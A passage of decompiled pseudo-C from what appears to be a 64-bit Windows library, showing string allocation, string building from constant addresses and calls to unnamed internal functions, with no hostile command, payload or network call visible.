*(iVar6 + -8),  0x1f < (iVar6 - iVar19) - 8U))\n            goto code_r0x000180024ac6;\n            fcn.18008fb24(iVar19);\n        }\n        uStack400 = *0x180101900;\n        uStack392 = *0x180101908;\n        uStack416 = 0;\n        uStack415 = 0;\n        if (0xf < uStack328) {\n            pppppuVar18 = pppppuStack352;\n            if ((0xfff < uStack328 + 1) &&\n               (pppppuVar18 = pppppuStack352[-1],  0x1f < pppppuStack352 + (-8 - pppppuVar18)))\n            goto code_r0x000180024acc;\n            fcn.18008fb24(pppppuVar18);\n        }\n        uStack336 = CONCAT44(*0x180101914, *0x180101910);\n        uStack328 = CONCAT44(*0x18010191c, *0x180101918);\n        pppppuStack352 = pppppuStack352 & 0xffffffffffffff00;\n        if (0xf < uStack360) {\n            iVar6 = CONCAT71(Stack383, uStack384);\n            iVar19 = iVar6;\n            if ((0xfff < uStack360 + 1) && (iVar19 = *(iVar6 + -8),  0x1f < (iVar6 - iVar19) - 8U))\n            goto code_r0x000180024ad2;\n            fcn.18008fb24(iVar19);\n        }\n        ppppppuStack320 = &pppppuStack488;\n        pppppuVar18 = NULL;\n        uStack472 = 0;\n        uStack464 = 0;\n        ppppppuVar29 = appppppuStack152;\n        if (0xf < uVar27) {\n            ppppppuVar29 = ppppppuVar26;\n        }\n        if (0xf < uVar24) {\n            uVar27 = uVar24 | 0xf;\n            if (0x7fffffffffffffff < uVar27) {\n                uVar27 = 0x7fffffffffffffff;\n            }\n            uVar25 = uVar27 + 1;\n            if (uVar25 < 0x1000) {\n                if (uVar25 != 0) {\n                    pppppuVar18 = fcn.18008fb2c(uVar25);\n                }\ncode_r0x000180023361:\n                pppppuStack488 = pppppuVar18;\n                fcn.1800ade80(pppppuVar18, ppppppuVar29, uVar24 + 1);\n                goto code_r0x000180023375;\n            }\n            uVar20 = uVar27 + 0x28;\n            if (uVar20 <= uVar25) {\n                uVar20 = 0xffffffffffffffff;\n            }\n            ppppuVar17 = fcn.18008fb2c(uVar20);\n            if (ppppuVar17 != NULL) {\n                pppppuVar18 = ppppuVar17 + 0x27U & 0xffffffffffffffe0;\n                pppppuVar18[-1] = ppppuVar17;\n                goto code_r0x000180023361;\n            }\n            goto code_r0x000180024ae4;\n        }\n        pppppuStack488 = *ppppppuVar29;\n        uStack480 = *(ppppppuVar29 + 1);\n        uStack476 = *(ppppppuVar29 + 0xc);\n        uVar27 = 0xf;\ncode_r0x000180023375:\n        uStack472 = uVar24;\n        uStack368 = CONCAT44(*0x180101914, *0x180101910);\n        uStack360 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack384 = 0;\n        uStack464 = uVar27;\n        fcn.180011120(&uStack384, 0x1800f46aa, 0);\n        uStack336 = CONCAT44(*0x180101914, *0x180101910);\n        uStack328 = CONCAT44(*0x18010191c, *0x180101918);\n        pppppuStack352 = pppppuStack352 & 0xffffffffffffff00;\n        pppppuVar18 = &pppppuStack352;\n        fcn.180011120(pppppuVar18, 0x1800f6078, 0x10);\n        pppppuStack496 = &pppppuStack488;\n        ppppppuStack504 = &uStack384;\n        uVar10 = fcn.180004f50(pppppuVar18, &uStack416, arg3, &pppppuStack352);\n        fcn.18000d960(iVar32 + 0x40, uVar10);\n        if (7 < uStack392) {\n            iVar6 = CONCAT62(Stack414, CONCAT11(uStack415, uStack416));\n            iVar19 = iVar6;\n            if ((uStack392 * 2 + 2 < 0x1000) || (iVar19 = *(iVar6 + -8),  (iVar6 - iVar19) - 8U < 0x20)) {\n                fcn.18008fb24(iVar19);\n                goto code_r0x00018002343d;\n            }\n            goto code_r0x000180024ad8;\n        }\ncode_r0x00018002343d:\n        uStack400 = *0x180101900;\n        uStack392 = *0x180101908;\n        uStack416 = 0;\n        uStack415 = 0;\n        if (0xf < uStack328) {\n            pppppuVar18 = pppppuStack352;\n            if ((uStack328 + 1 < 0x1000) ||\n               (pppppuVar18 = pppppuStack352[-1],  pppppuStack352 + (-8 - pppppuVar18) < 0x20)) {\n                fcn.18008fb24(pppppuVar18);\n                goto code_r0x00018002348c;\n            }\n            goto code_r0x000180024ade;\n        }\ncode_r0x00018002348c:\n        uStack336 = CONCAT44(*0x180101914, *0x180101910);\n        uStack328 = CONCAT44(*0x18010191c, *0x180101918);\n        pppppuStack352 = pppppuStack352 & 0xffffffffffffff00;\n        if (0xf < uStack360) {\n            iVar6 = CONCAT71(Stack383, uStack384);\n            iVar19 = iVar6;\n            if ((0xfff < uStack360 + 1) && (iVar19 = *(iVar6 + -8),  0x1f < (iVar6 - iVar19) - 8U))\n            goto code_r0x000180024ae4;\n            fcn.18008fb24(iVar19);\n        }\n        ppppppuStack320 = &uStack384;\n        uStack368 = 0;\n        uStack360 = 0xf;\n        uStack384 = 0;\n        fcn.180011120(&uStack384, 0x1800f46ab, 0);\n        uStack336 = CONCAT44(*0x180101914, *0x180101910);\n        uStack328 = CONCAT44(*0x18010191c, *0x180101918);\n        pppppuStack352 = pppppuStack352 & 0xffffffffffffff00;\n        fcn.180011120(&pppppuStack352, 0x1800f4c0c, 1);\n        uStack472 = CONCAT44(*0x180101914, *0x180101910);\n        uStack464 = CONCAT44(*0x18010191c, *0x180101918);\n        pppppuStack488 = pppppuStack488 & 0xffffffffffffff00;\n        pppppuVar18 = &pppppuStack488;\n        fcn.180011120(pppppuVar18, 0x1800f6098, 0xe);\n        pppppuStack496 = &uStack384;\n        ppppppuStack504 = &pppppuStack352;\n        ppuVar11 = fcn.180004b90(pppppuVar18, &uStack416, arg3, &pppppuStack488);\n        ppuVar1 = ppuVar11 + 2;\n        if (0xf < ppuVar11[3]) {\n            ppuVar11 = *ppuVar11;\n        }\n        if (*ppuVar1 == 0x1) {\n            if (*ppuVar11 == 0x59) {\n                uVar33 = 0;\n            }\n            else {\n                uVar33 = -(*ppuVar11 < 0x59) | 1;\n            }\n            if (uVar33 != 0) goto code_r0x0001800235a5;\n            uVar7 = 1;\n        }\n        else {\ncode_r0x0001800235a5:\n            uVar7 = 0;\n        }\n        *(iVar32 + 0x60) = uVar7;\n        if (0xf < uStack392) {\n            iVar6 = CONCAT62(Stack414, CONCAT11(uStack415, uStack416));\n            iVar19 = iVar6;\n            if ((uStack392 + 1 < 0x1000) || (iVar19 = *(iVar6 + -8),  (iVar6 - iVar19) - 8U < 0x20)) {\n                fcn.18008fb24(iVar19);\n                goto code_r0x0001800235e7;\n            }\n            goto code_r0x000180024aea;\n        }\ncode_r0x0001800235e7:\n        uStack400 = CONCAT44(*0x180101914, *0x180101910);\n        uStack392 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack416 = 0;\n        if (0xf < uStack464) {\n            pppppuVar18 = pppppuStack488;\n            if ((uStack464 + 1 < 0x1000) ||\n               (pppppuVar18 = pppppuStack488[-1],  pppppuStack488 + (-8 - pppppuVar18) < 0x20)) {\n                fcn.18008fb24(pppppuVar18);\n                goto code_r0x000180023636;\n            }\n            goto code_r0x000180024af0;\n        }\ncode_r0x000180023636:\n        uStack472 = CONCAT44(*0x180101914, *0x180101910);\n        uStack464 = CONCAT44(*0x18010191c, *0x180101918);\n        pppppuStack488 = pppppuStack488 & 0xffffffffffffff00;\n        if (0xf < uStack328) {\n            pppppuVar18 = pppppuStack352;\n            if ((uStack328 + 1 < 0x1000) ||\n               (pppppuVar18 = pppppuStack352[-1],  pppppuStack352 + (-8 - pppppuVar18) < 0x20)) {\n                fcn.18008fb24(pppppuVar18);\n                goto code_r0x000180023684;\n            }\n            goto code_r0x000180024af6;\n        }\ncode_r0x000180023684:\n        puVar34 = iVar32 + 0x80;\n        ppppppuVar26 = appppppuStack152[0];\n        uVar33 = 0;\n        do {\n            uVar31 = uVar33 + 1;\n            fcn.180020af0(&var_58h, 5, 0x1800f60a8, uVar31);\n            ppppppuStack320 = &ppppppuStack456;\n            uStack440 = 0;\n            uStack432 = 0;\n            ppppppuVar29 = appppppuStack152;\n            if (0xf < var_bp_78h) {\n                ppppppuVar29 = ppppppuVar26;\n            }\n            if (uVar24 < 0x10) {\n                ppppppuStack456 = *ppppppuVar29;\n                uStack448 = *(ppppppuVar29 + 1);\n                uStack444 = *(ppppppuVar29 + 0xc);\n                uStack432 = 0xf;\n            }\n            else {\n                uVar27 = uVar24 | 0xf;\n                if (0x7fffffffffffffff < uVar27) {\n                    uVar27 = 0x7fffffffffffffff;\n                }\n                ppppppuVar13 = uVar27 + 1;\n                if (ppppppuVar13 < 0x1000) {\n                    if (ppppppuVar13 != NULL) {\n                        ppppppuVar13 = fcn.18008fb2c(ppppppuVar13);\n                    }\n                }\n                else {\n                    ppppppuVar28 = uVar27 + 0x28;\n                    if (ppppppuVar28 <= ppppppuVar13) {\n                        ppppppuVar28 = 0xffffffffffffffff;\n                    }\n                    pppppuVar12 = fcn.18008fb2c(ppppppuVar28);\n                    if (pppppuVar12 == NULL) goto code_r0x000180024b02;\n                    ppppppuVar13 = pppppuVar12 + 0x27U & 0xffffffffffffffe0;\n                    ppppppuVar13[-1] = pppppuVar12;\n                }\n                ppppppuStack456 = ppppppuVar13;\n                fcn.1800ade80(ppppppuVar13, ppppppuVar29, uVar24 + 1);\n                ppppppuVar26 = appppppuStack152[0];\n                uStack432 = uVar27;\n            }\n            uStack440 = uVar24;\n            aiStack312[0] = 0;\n            uStack472 = 0;\n            uStack464 = 0xf;\n            pppppuStack488 = pppppuStack488 & 0xffffffffffffff00;\n            iVar19 = -1;\n            do {\n                iVar30 = iVar19 + 1;\n                iVar6 = iVar19 + 1;\n                iVar19 = iVar30;\n            } while (*(&var_58h + iVar6) != '\\0');\n            puVar23 = &var_58h;\n            fcn.180011120(&pppppuStack488, puVar23, iVar30);\n            pppppuVar18 = &pppppuStack488;\n            puVar14 = fcn.180020820(pppppuVar18, puVar23, 0x1800f60b0, 10);\n            pppppuStack352 = *puVar14;\n            uStack344 = *(puVar14 + 1);\n            uStack340 = *(puVar14 + 0xc);\n            uStack336 = puVar14[2];\n            uStack328 = puVar14[3];\n            puVar14[2] = 0;\n            puVar14[3] = 0xf;\n            *puVar14 = 0;\n            ppppppuStack504 = &ppppppuStack456;\n            uVar8 = fcn.1800054e0(pppppuVar18, uStack304, &pppppuStack352, aiStack312);\n            *puVar34 = uVar8;\n            if (0xf < uStack328) {\n                pppppuVar18 = pppppuStack352;\n                if ((0xfff < uStack328 + 1) &&\n                   (pppppuVar18 = pppppuStack352[-1],  0x1f < pppppuStack352 + (-8 - pppppuVar18)))\n                goto code_r0x000180024afc;\n                fcn.18008fb24(pppppuVar18);\n            }\n            uStack336 = 0;\n            uStack328 = 0xf;\n            pppppuStack352 = pppppuStack352 & 0xffffffffffffff00;\n            if (0xf < uStack464) {\n                pppppuVar18 = pppppuStack488;\n                if ((0xfff < uStack464 + 1) &&\n                   (pppppuVar18 = pppppuStack488[-1],  0x1f < pppppuStack488 + (-8 - pppppuVar18)))\n                goto code_r0x000180024b02;\n                fcn.18008fb24(pppppuVar18);\n            }\n            ppppppuStack320 = &pppppuStack352;\n            uStack336 = 0;\n            uStack328 = 0;\n            ppppppuVar29 = appppppuStack152;\n            if (0xf < var_bp_78h) {\n                ppppppuVar29 = ppppppuVar26;\n            }\n            if (uVar24 < 0x10) {\n                pppppuStack352 = *ppppppuVar29;\n                uStack344 = *(ppppppuVar29 + 1);\n                uStack340 = *(ppppppuVar29 + 0xc);\n                uStack328 = 0xf;\n            }\n            else {\n                uVar27 = uVar24 | 0xf;\n                if (0x7fffffffffffffff < uVar27) {\n                    uVar27 = 0x7fffffffffffffff;\n                }\n                pppppuVar18 = uVar27 + 1;\n                if (pppppuVar18 < 0x1000) {\n                    if (pppppuVar18 != NULL) {\n                        pppppuVar18 = fcn.18008fb2c(pppppuVar18);\n                    }\n                }\n                else {\n                    pppppuVar21 = uVar27 + 0x28;\n                    if (pppppuVar21 <= pppppuVar18) {\n                        pppppuVar21 = 0xffffffffffffffff;\n                    }\n                    ppppuVar17 = fcn.18008fb2c(pppppuVar21);\n                    if (ppppuVar17 == NULL) goto code_r0x000180024b1a;\n                    pppppuVar18 = ppppuVar17 + 0x27U & 0xffffffffffffffe0;\n                    pppppuVar18[-1] = ppppuVar17;\n                }\n                pppppuStack352 = pppppuVar18;\n                fcn.1800ade80(pppppuVar18, ppppppuVar29, uVar24 + 1);\n                ppppppuVar26 = appppppuStack152[0];\n                uStack328 = uVar27;\n            }\n            uStack336 = uVar24;\n            uStack368 = 0;\n            uStack360 = 0xf;\n            uStack384 = 0;\n            fcn.180011120(&uStack384, 0x1800f46ae, 0);\n            uStack472 = 0;\n            uStack464 = 0xf;\n            pppppuStack488 = pppppuStack488 & 0xffffffffffffff00;\n            iVar19 = -1;\n            do {\n                iVar30 = iVar19 + 1;\n                iVar6 = iVar19 + 1;\n                iVar19 = iVar30;\n            } while (*(&var_58h + iVar6) != '\\0');\n            puVar23 = &var_58h;\n            fcn.180011120(&pppppuStack488, puVar23, iVar30);\n            pppppuVar18 = &pppppuStack488;\n            puVar14 = fcn.180020820(pppppuVar18, puVar23, 0x1800f60c0, 0xb);\n            ppppppuStack456 = *puVar14;\n            uStack448 = *(puVar14 + 1);\n            uStack444 = *(puVar14 + 0xc);\n            uStack440 = puVar14[2];\n            uStack432 = puVar14[3];\n            puVar14[2] = 0;\n            puVar14[3] = 0xf;\n            *puVar14 = 0;\n            uStack424 = uStack424 | 0xc;\n            pppppuStack496 = &pppppuStack352;\n            ppppppuStack504 = &uStack384;\n            uVar10 = fcn.180004f50(pppppuVar18, &uStack416, uStack304, &ppppppuStack456);\n            fcn.18000d960(uVar33 * 0x20 + 0x90 + iVar32, uVar10);\n            if (7 < uStack392) {\n                iVar6 = CONCAT62(Stack414, CONCAT11(uStack415, uStack416));\n                iVar19 = iVar6;\n                if ((0xfff < uStack392 * 2 + 2) && (iVar19 = *(iVar6 + -8),  0x1f < (iVar6 - iVar19) - 8U))\n                goto code_r0x000180024b08;\n                fcn.18008fb24(iVar19);\n            }\n            uStack400 = 0;\n            uStack392 = 7;\n            uStack416 = 0;\n            uStack415 = 0;\n            if (0xf < uStack432) {\n                ppppppuVar13 = ppppppuStack456;\n                if ((0xfff < uStack432 + 1) &&\n                   (ppppppuVar13 = ppppppuStack456[-1],  0x1f < ppppppuStack456 + (-8 - ppppppuVar13)))\n                goto code_r0x000180024b0e;\n                fcn.18008fb24(ppppppuVar13);\n            }\n            uStack440 = 0;\n            uStack432 = 0xf;\n            ppppppuStack456 = ppppppuStack456 & 0xffffffffffffff00;\n            if (0xf < uStack464) {\n                pppppuVar18 = pppppuStack488;\n                if ((0xfff < uStack464 + 1) &&\n                   (pppppuVar18 = pppppuStack488[-1],  0x1f < pppppuStack488 + (-8 - pppppuVar18)))\n                goto code_r0x000180024b14;\n                fcn.18008fb24(pppppuVar18);\n            }\n            uStack472 = 0;\n            uStack464 = 0xf;\n            pppppuStack488 = pppppuStack488 & 0xffffffffffffff00;\n            if (0xf < uStack360) {\n                iVar6 = CONCAT71(Stack383, uStack384);\n                iVar19 = iVar6;\n                if ((0xfff < uStack360 + 1) && (iVar19 = *(iVar6 + -8),  0x1f < (iVar6 - iVar19) - 8U))\n                goto code_r0x000180024b1a;\n                fcn.18008fb24(iVar19);\n            }\n            puVar34 = puVar34 + 1;\n            uVar33 = uVar31;\n        } while (uVar31 < 3);\n        _var_bp_70h = ZEXT816(0);\n        uStack104 = 0;\n        ppppppuStack320 = &pppppuStack488;\n        uStack472 = 0;\n        uStack464 = 0;\n        ppppppuVar29 = appppppuStack152;\n        if (0xf < var_bp_78h) {\n            ppppppuVar29 = ppppppuVar26;\n        }\n        if (uVar24 < 0x10) {\n            pppppuStack488 = *ppppppuVar29;\n            uStack480 = *(ppppppuVar29 + 1);\n            uStack476 = *(ppppppuVar29 + 0xc);\n            uVar27 = 0xf;\n        }\n        else {\n            uVar27 = uVar24 | 0xf;\n            if (0x7fffffffffffffff < uVar27) {\n                uVar27 = 0x7fffffffffffffff;\n            }\n            pppppuVar18 = uVar27 + 1;\n            if (pppppuVar18 < 0x1000) {\n                if (pppppuVar18 != NULL) {\n                    pppppuVar18 = fcn.18008fb2c(pppppuVar18);\n                }\n            }\n            else {\n                pppppuVar21 = uVar27 + 0x28;\n                if (pppppuVar21 <= pppppuVar18) {\n                    pppppuVar21 = 0xffffffffffffffff;\n                }\n                ppppuVar17 = fcn.18008fb2c(pppppuVar21);\n                if (ppppuVar17 == NULL) goto code_r0x000180024b26;\n                pppppuVar18 = ppppuVar17 + 0x27U & 0xffffffffffffffe0;\n                pppppuVar18[-1] = ppppuVar17;\n            }\n            pppppuStack488 = pppppuVar18;\n            fcn.1800ade80(pppppuVar18, ppppppuVar29, uVar24 + 1);\n        }\n        uStack472 = uVar24;\n        uStack400 = CONCAT44(*0x180101914, *0x180101910);\n        uStack392 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack416 = 0;\n        uStack464 = uVar27;\n        fcn.180011120(&uStack416, 0x1800f46af, 0);\n        uStack336 = CONCAT44(*0x180101914, *0x180101910);\n        uStack328 = CONCAT44(*0x18010191c, *0x180101918);\n        pppppuStack352 = pppppuStack352 & 0xffffffffffffff00;\n        pppppuVar18 = &pppppuStack352;\n        fcn.180011120(pppppuVar18, 0x1800f60d0, 0xb);\n        pppppuStack496 = &pppppuStack488;\n        ppppppuStack504 = &uStack416;\n        iVar9 = fcn.180009a40(pppppuVar18, &var_bp_70h, uStack304, &pppppuStack352);\n        aiStack312[0] = iVar9;\n        if (uStack328 < 0x10) {\ncode_r0x000180023d1a:\n            uStack336 = CONCAT44(*0x180101914, *0x180101910);\n            uStack328 = CONCAT44(*0x18010191c, *0x180101918);\n            pppppuStack352 = pppppuStack352 & 0xffffffffffffff00;\n            if (uStack392 < 0x10) {\ncode_r0x000180023d67:\n                ppppppuVar13 = iVar32 + 0x68;\n                pppppuVar12 = *(iVar32 + 0x70);\n                pppppuVar15 = *ppppppuVar13;\n                ppppppuStack320 = ppppppuVar13;\n                if (pppppuVar15 != pppppuVar12) {\n                    do {\n                        fcn.1800252e0(pppppuVar15);\n                        pppppuVar15 = pppppuVar15 + 0x14;\n                    } while (pppppuVar15 != pppppuVar12);\n                    pppppuVar15 = *ppppppuVar13;\n                }\n                *(iVar32 + 0x70) = pppppuVar15;\n                fcn.18002daa0(ppppppuVar13, iVar9);\n                if (0 < iVar9) {\n                    var_58h = 0;\n                    uVar33 = uStack424;\n                    do {\n                        pppppuVar18 = NULL;\n                        var_bp_70h = var_58h * 0x20 + var_bp_70h;\n                        pppppuVar12 = *ppppppuStack320 + var_58h * 0x14;\n                        pppppuStack296 = &pppppuStack488;\n                        uStack472 = 0;\n                        uStack464 = 0;\n                        ppppppuVar26 = appppppuStack152;\n                        if (0xf < var_bp_78h) {\n                            ppppppuVar26 = appppppuStack152[0];\n                        }\n                        if (uVar24 < 0x10) {\n                            pppppuStack488 = *ppppppuVar26;\n                            uStack480 = *(ppppppuVar26 + 1);\n                            uStack476 = *(ppppppuVar26 + 0xc);\n                            uStack464 = 0xf;\n                        }\n                        else {\n                            uVar27 = uVar24 | 0xf;\n                            if (0x7fffffffffffffff < uVar27) {\n                                uVar27 = 0x7fffffffffffffff;\n                            }\n                            uVar25 = uVar27 + 1;\n                            if (uVar25 < 0x1000) {\n                                if (uVar25 != 0) {\n                                    pppppuVar18 = fcn.18008fb2c(uVar25);\n                                }\n                            }\n                            else {\n                                uVar20 = uVar27 + 0x28;\n                                if (uVar20 <= uVar25) {\n                                    uVar20 = 0xffffffffffffffff;\n                                }\n                                ppppuVar17 = fcn.18008fb2c(uVar20);\n                                if (ppppuVar17 == NULL) goto code_r0x000180024b38;\n                                pppppuVar18 = ppppuVar17 + 0x27U & 0xffffffffffffffe0;\n                                pppppuVar18[-1] = ppppuVar17;\n                            }\n                            pppppuStack488 = pppppuVar18;\n                            fcn.1800ade80(pppppuVar18, ppppppuVar26, uVar24 + 1);\n                            uStack464 = uVar27;\n                        }\n                        uStack368 = 0;\n                        uStack360 = 0xf;\n                        uStack384 = 0;\n                        uStack472 = uVar24;\n                        fcn.180011120(&uStack384, 0x1800f46be, 0);\n                        uStack440 = 0;\n                        uStack432 = 0xf;\n                        ppppppuStack456 = ppppppuStack456 & 0xffffffffffffff00;\n                        uStack424 = uVar33 | 0x10;\n                        uVar27 = *(var_bp_70h + 0x10) + 6;\n                        if (0xf < uVar27) {\n                            fcn.1800137f0(&ppppppuStack456, uVar27);\n                        }\n                        uStack440 = 0;\n                        fcn.18000dc30(&ppppppuStack456, var_bp_70h);\n                        if (uStack432 - uStack440 < 6) {\n                            ppppppuStack504 = 0x6;\n                            ppppppuVar13 = &ppppppuStack456;\n                            fcn.180014270(ppppppuVar13, 6, 0, 0x1800f4cb4);\n                        }\n                        else {\n                            ppppppuVar28 = &ppppppuStack456;\n                            if (0xf < uStack432) {\n                                ppppppuVar28 = ppppppuStack456;\n                            }\n                            ppppppuVar28 = ppppppuVar28 + uStack440;\n                            ppppppuVar13 = ppppppuVar28;\n                            uStack440 = uStack440 + 6;\n                            fcn.1800ade80(ppppppuVar28, 0x1800f4cb4, 6);\n                            *(ppppppuVar28 + 6) = 0;\n                        }\n                        pppppuStack496 = &pppppuStack488;\n                        ppppppuStack504 = &uStack384;\n                        pppppuVar15 = fcn.180004f50(ppppppuVar13, &uStack416, uStack304, &ppppppuStack456);\n                        if (pppppuVar12 != pppppuVar15) {\n                            if (0x7 < pppppuVar12[3]) {\n                                ppppuVar2 = *pppppuVar12;\n                                ppppuVar22 = ppppuVar2;\n                                if ((0xfff < pppppuVar12[3] * 2 + 2U) &&\n                                   (ppppuVar22 = ppppuVar2[-1],  0x1f < ppppuVar2 + (-8 - ppppuVar22)))\n                                goto code_r0x000180024b2c;\n                                fcn.18008fb24(ppppuVar22);\n                            }\n                            pppppuVar12[2] = NULL;\n                            pppppuVar12[3] = 0x7;\n                            *pppppuVar12 = 0;\n                            uVar8 = *(pppppuVar15 + 4);\n                            uVar4 = *(pppppuVar15 + 1);\n                            uVar5 = *(pppppuVar15 + 0xc);\n                            *pppppuVar12 = *pppppuVar15;\n                            *(pppppuVar12 + 4) = uVar8;\n                            *(pppppuVar12 + 1) = uVar4;\n                            *(pppppuVar12 + 0xc) = uVar5;\n                            uVar8 = *(pppppuVar15 + 0x14);\n                            uVar4 = *(pppppuVar15 + 3);\n                            uVar5 = *(pppppuVar15 + 0x1c);\n                            *(pppppuVar12 + 2) = *(pppppuVar15 + 2);\n                            *(pppppuVar12 + 0x14) = uVar8;\n                            *(pppppuVar12 + 3) = uVar4;\n                            *(pppppuVar12 + 0x1c) = uVar5;\n                            pppppuVar15[2] = NULL;\n                            pppppuVar15[3] = 0x7;\n                            *pppppuVar15 = 0;\n                        }\n                        if (7 < uStack392) {\n                            iVar19 = CONCAT62(Stack414, CONCAT11(uStack415, uStack416));\n                            iVar32 = iVar19;\n                            if ((0xfff < uStack392 * 2 + 2) && (iVar32 = *(iVar19 + -8),  0x1f < (iVar19 - iVar32) - 8U)\n                               ) goto code_r0x000180024b2c;\n                            fcn.18008fb24(iVar32);\n                        }\n                        uStack400 = 0;\n                        uStack392 = 7;\n                        uStack416 = 0;\n                        uStack415 = 0;\n                        if (0xf < uStack432) {\n                            ppppppuVar13 = ppppppuStack456;\n                            if ((0xfff < uStack432 + 1) &&\n                               (ppppppuVar13 = ppppppuStack456[-1],  0x1f < ppppppuStack456 + (-8 - ppppppuVar13)))\n                            goto code_r0x000180024b32;\n                            fcn.18008fb24(ppppppuVar13);\n                        }\n                        uStack440 = 0;\n                        uStack432 = 0xf;\n                        ppppppuStack456 = ppppppuStack456 & 0xffffffffffffff00;\n                        if (0xf < uStack360) {\n                            iVar19 = CONCAT71(Stack383, uStack384);\n                            iVar32 = iVar19;\n                            if ((0xfff < uStack360 + 1) && (iVar32 = *(iVar19 + -8),  0x1f < (iVar19 - iVar32) - 8U))\n                            goto code_r0x000180024b38;\n                            fcn.18008fb24(iVar32);\n                        }\n                        pppppuStack296 = &pppppuStack488;\n                        uStack472 = 0;\n                        uStack464 = 0;\n                        ppppppuVar26 = appppppuStack152;\n                        if (0xf < var_bp_78h) {\n                            ppppppuVar26 = appppppuStack152[0];\n                        }\n                        if (uVar24 < 0x10) {\n                            pppppuStack488 = *ppppppuVar26;\n                            uStack480 = *(ppppppuVar26 + 1);\n                            uStack476 = *(ppppppuVar26 + 0xc);\n                            uStack464 = 0xf;\n                        }\n                        else {\n                            uVar27 = uVar24 | 0xf;\n                            if (0x7fffffffffffffff < uVar27) {\n                                uVar27 = 0x7fffffffffffffff;\n                            }\n                            pppppuVar18 = uVar27 + 1;\n                            if (pppppuVar18 < 0x1000) {\n                                if (pppppuVar18 != NULL) {\n                                    pppppuVar18 = fcn.18008fb2c(pppppuVar18);\n                                }\n                            }\n                            else {\n                                pppppuVar21 = uVar27 + 0x28;\n                                if (pppppuVar21 <= pppppuVar18) {\n                                    pppppuVar21 = 0xffffffffffffffff;\n                                }\n                                ppppuVar17 = fcn.18008fb2c(pppppuVar21);\n                                if (ppppuVar17 == NULL) goto code_r0x000180024b4a;\n                                pppppuVar18 = ppppuVar17 + 0x27U & 0xffffffffffffffe0;\n                                pppppuVar18[-1] = ppppuVar17;\n                            }\n                            pppppuStack488 = pppppuVar18;\n                            fcn.1800ade80(pppppuVar18, ppppppuVar26, uVar24 + 1);\n                            uStack464 = uVar27;\n                        }\n                        uStack368 = 0;\n                        uStack360 = 0xf;\n                        uStack384 = 0;\n                        uStack472 = uVar24;\n                        fcn.180011120(&uStack384, 0x1800f46bf, 0);\n                        uStack440 = 0;\n                        uStack432 = 0xf;\n                        ppppppuStack456 = ppppppuStack456 & 0xffffffffffffff00;\n                        uStack424 = uVar33 & 0xffffffef | 0x20;\n                        uVar27 = *(var_bp_70h + 0x10) + 7;\n                        if (0xf < uVar27) {\n                            fcn.1800137f0(&ppppppuStack456, uVar27);\n                        }\n                        uStack440 = 0;\n                        fcn.18000dc30(&ppppppuStack456, var_bp_70h);\n                        if (uStack432 - uStack440 < 7) {\n                            ppppppuStack504 = 0x7;\n                            ppppppuVar13 = &ppppppuStack456;\n                            fcn.180014270(ppppppuVar13, 7, 0, 0x1800f60e0);\n                        }\n                        else {\n                            ppppppuVar28 = &ppppppuStack456;\n                            if (0xf < uStack432) {\n                                ppppppuVar28 = ppppppuStack456;\n                            }\n                            ppppppuVar28 = ppppppuVar28 + uStack440;\n                            ppppppuVar13 = ppppppuVar28;\n                            uStack440 = uStack440 + 7;\n                            fcn.1800ade80(ppppppuVar28, 0x1800f60e0, 7);\n                            *(ppppppuVar28 + 7) = 0;\n                        }\n                        pppppuStack496 = &pppppuStack488;\n                        ppppppuStack504 = &uStack384;\n                        pppppuVar16 = fcn.180004f50(ppppppuVar13, &uStack416, uStack304, &ppppppuStack456);\n                        pppppuVar15 = pppppuVar12 + 4;\n                        if (pppppuVar15 != pppppuVar16) {\n                            if (0x7 < pppppuVar12[7]) {\n                                ppppuVar2 = *pppppuVar15;\n                                ppppuVar22 = ppppuVar2;\n                                if ((0xfff < pppppuVar12[7] * 2 + 2U) &&\n                                   (ppppuVar22 = ppppuVar2[-1],  0x1f < ppppuVar2 + (-8 - ppppuVar22)))\n                                goto code_r0x000180024b3e;\n                                fcn.18008fb24(ppppuVar22);\n                            }\n                            pppppuVar12[6] = NULL;\n                            pppppuVar12[7] = 0x7;\n                            *pppppuVar15 = 0;\n                            uVar8 = *(pppppuVar16 + 4);\n                            uVar4 = *(pppppuVar16 + 1);\n                            uVar5 = *(pppppuVar16 + 0xc);\n                            *pppppuVar15 = *pppppuVar16;\n                            *(pppppuVar12 + 0x24) = uVar8;\n                            *(pppppuVar12 + 5) = uVar4;\n                            *(pppppuVar12 + 0x2c) = uVar5;\n                            uVar8 = *(pppppuVar16 + 0x14);\n                            uVar4 = *(pppppuVar16 + 3);\n                            uVar5 = *(pppppuVar16 + 0x1c);\n                            *(pppppuVar12 + 6) = *(pppppuVar16 + 2);\n                            *(pppppuVar12 + 0x34) = uVar8;\n                            *(pppppuVar12 + 7) = uVar4;\n                            *(pppppuVar12 + 0x3c) = uVar5;\n                            pppppuVar16[2] = NULL;\n                            pppppuVar16[3] = 0x7;\n                            *pppppuVar16 = 0;\n                        }\n                        if (7 < uStack392) {\n                            iVar19 = CONCAT62(Stack414, CONCAT11(uStack415, uStack416));\n                            iVar32 = iVar19;\n                            if ((0xfff < uStack392 * 2 + 2) && (iVar32 = *(iVar19 + -8),  0x1f < (iVar19 - iVar32) - 8U)\n                               ) goto code_r0x000180024b3e;\n                            fcn.18008fb24(iVar32);\n                        }\n                        uStack400 = 0;\n                        uStack392 = 7;\n                        uStack416 = 0;\n                        uStack415 = 0;\n                        if (0xf < uStack432) {\n                            ppppppuVar13 = ppppppuStack456;\n                            if ((0xfff < uStack432 + 1) &&\n                               (ppppppuVar13 = ppppppuStack456[-1],  0x1f < ppppppuStack456 + (-8 - ppppppuVar13)))\n                            goto code_r0x000180024b44;\n                            fcn.18008fb24(ppppppuVar13);\n                        }\n                        uStack440 = 0;\n                        uStack432 = 0xf;\n                        ppppppuStack456 = ppppppuStack456 & 0xffffffffffffff00;\n                        if (0xf < uStack360) {\n                            iVar19 = CONCAT71(Stack383, uStack384);\n                            iVar32 = iVar19;\n                            if ((0xfff < uStack360 + 1) && (iVar32 = *(iVar19 + -8),  0x1f < (iVar19 - iVar32) - 8U))\n                            goto code_r0x000180024b4a;\n                            fcn.18008fb24(iVar32);\n                        }\n                        pppppuStack296 = &pppppuStack488;\n                        uStack472 = 0;\n                        uStack464 = 0;\n                        ppppppuVar26 = appppppuStack152;\n                        if (0xf < var_bp_78h) {\n                            ppppppuVar26 = appppppuStack152[0];\n                        }\n                        if (uVar24 < 0x10) {\n                            pppppuStack488 = *ppppppuVar26;\n                            